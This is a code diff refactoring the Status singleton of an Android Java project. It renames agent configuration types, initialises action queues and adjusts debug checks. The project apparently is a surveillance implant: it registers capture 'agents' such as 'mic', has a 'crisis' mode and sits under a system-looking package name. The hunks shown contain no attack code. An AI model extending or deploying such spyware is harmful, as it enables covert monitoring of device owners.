@@ -13,11 +13,11 @@ import java.util.HashMap;
 import android.content.Context;
 
 import com.android.service.action.Action;
-import com.android.service.agent.AgentCrisis;
 import com.android.service.auto.Cfg;
-import com.android.service.conf.ConfAgent;
+import com.android.service.conf.ConfModule;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.Globals;
+import com.android.service.module.AgentCrisis;
 import com.android.service.util.Check;
 
 // Singleton Class
@@ -28,7 +28,7 @@ public class Status {
 	private static final String TAG = "Status"; //$NON-NLS-1$
 
 	/** The agents map. */
-	private final HashMap<String, ConfAgent> agentsMap;
+	private final HashMap<String, ConfModule> agentsMap;
 
 	/** The events map. */
 	private final HashMap<Integer, ConfEvent> eventsMap;
@@ -64,9 +64,14 @@ public class Status {
 	 * Instantiates a new status.
 	 */
 	private Status() {
-		agentsMap = new HashMap<String, ConfAgent>();
+		agentsMap = new HashMap<String, ConfModule>();
 		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
+
+		for (int i = 0; i < Action.NUM_QUEUE; i++) {
+			triggeredSemaphore[i] = new Object();
+			triggeredActions[i] = new ArrayList<Integer>();
+		}
 	}
 
 	/** The singleton. */
@@ -135,7 +140,7 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public void addAgent(final ConfAgent a) throws GeneralException {
+	public void addAgent(final ConfModule a) throws GeneralException {
 
 		if (agentsMap.containsKey(a.getType()) == true) {
 			// throw new RCSException("Agent " + a.getId() + " already loaded");
@@ -163,7 +168,7 @@ public class Status {
 	 */
 	public void addEvent(final ConfEvent e) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " addEvent "); //$NON-NLS-1$
+			//Check.log(TAG + " addEvent "); //$NON-NLS-1$
 		}
 		// Don't add the same event twice
 		if (eventsMap.containsKey(e.getId()) == true) {
@@ -230,7 +235,7 @@ public class Status {
 	 * 
 	 * @return the agents map
 	 */
-	public HashMap<String, ConfAgent> getAgentsMap() {
+	public HashMap<String, ConfModule> getAgentsMap() {
 		return agentsMap;
 	}
 
@@ -284,12 +289,12 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public ConfAgent getAgent(final String string) throws GeneralException {
+	public ConfModule getAgent(final String string) throws GeneralException {
 		if (agentsMap.containsKey(string) == false) {
 			throw new GeneralException("Agent " + string + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		final ConfAgent a = agentsMap.get(string);
+		final ConfModule a = agentsMap.get(string);
 
 		if (a == null) {
 			throw new GeneralException("Agent " + string + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -342,9 +347,14 @@ public class Status {
 	 */
 	public void triggerAction(final int i) {
 		Action action = actionsMap.get(new Integer(i));
-		int qq=action.getQueue();
+		int qq = action.getQueue();
 		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
 		Object tsem = triggeredSemaphore[qq];
+
+		if (Cfg.DEBUG)
+			Check.asserts(act != null, "triggerAction, null act");
+		if (Cfg.DEBUG)
+			Check.asserts(tsem != null, "triggerAction, null tsem");
 
 		synchronized (act) {
 			if (!act.contains(i)) {
@@ -369,7 +379,7 @@ public class Status {
 	 */
 	public int[] getTriggeredActions(int qq) {
 		if (Cfg.DEBUG)
-			Check.asserts(qq > 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);
+			Check.asserts(qq >= 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);
 
 		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
 		Object tsem = triggeredSemaphore[qq];
@@ -397,6 +407,25 @@ public class Status {
 
 			return triggered;
 		}
+	}
+	
+	/**
+	 * Dangerous, DO NOT USE
+	 * @param qq
+	 * @return
+	 */
+	@Deprecated
+	public int[] getNonBlockingTriggeredActions(int qq) {
+		
+		ArrayList<Integer> act = (ArrayList<Integer>) triggeredActions[qq];
+		final int size = act.size();
+		final int[] triggered = new int[size];
+
+		for (int i = 0; i < size; i++) {
+			triggered[i] = act.get(i);
+		}
+
+		return triggered;
 	}
 
 	/**
@@ -463,7 +492,7 @@ public class Status {
 			Check.log(TAG + " setCrisis: " + type); //$NON-NLS-1$
 		}
 
-		ConfAgent agent;
+		ConfModule agent;
 		try {
 			agent = getAgent("mic");
 			if (agent != null) {
